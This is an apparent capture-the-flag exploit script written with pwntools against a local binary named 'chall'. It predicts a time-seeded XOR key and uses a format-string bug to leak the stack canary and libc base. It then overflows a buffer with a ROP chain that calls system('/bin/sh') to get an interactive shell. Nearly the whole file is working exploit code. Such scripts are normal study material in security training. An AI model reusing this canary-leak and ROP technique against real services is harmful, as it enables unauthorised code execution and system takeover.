from pwn import *
from ctypes import CDLL 
import time

context.binary = elf = ELF("./chall")
context.terminal = ['xfce4-terminal', '-e']
context.log_level = 'error'

libc = ELF("libc.so.6")
cdll = CDLL("libc.so.6")
cdll.srand(cdll.time(0))
key = cdll.rand() % 256
print(key)

if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
	p = gdb.debug([elf.path],'''
            b *main
            continue
        ''')
elif len(sys.argv) > 1 and sys.argv[1] == 'fuz':
    #fuzzing
    for i in range(100):
        try:
            p = process()
            p.sendlineafter(b'> ',b'2')
            payload = xor(f'%{i}$p'.encode(),key)
            p.sendlineafter(b'> ',payload)
            p.recvuntil(b'hai : ')
            a = p.recvline().strip()
            print(i,a)
            p.close()
        except ValueError:
            pass
else:
    p = process()
    #p = remote('localhost',9999)

p.sendlineafter(b'> ',b'2')
payload = xor(b'%21$p||%27$p',key)
p.sendlineafter(b'> ',payload)
p.recvuntil(b'hai : ')
a = p.recvline().strip().decode('ascii', 'ignore')
leaks = a.split('||')
print(leaks)

can = eval(leaks[0])
print(hex(can))

libc.address = eval(leaks[1]) - 0x29d68
print(hex(libc.address))

p.sendlineafter(b'> ',b'1')
offset = 72
rop = ROP(libc)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b"/bin/sh\0")))
payload = flat({offset:[can,0xdeadbeef,rop.chain()]})
p.sendline(payload)
p.interactive()

#biasa error karena xor nya mungkin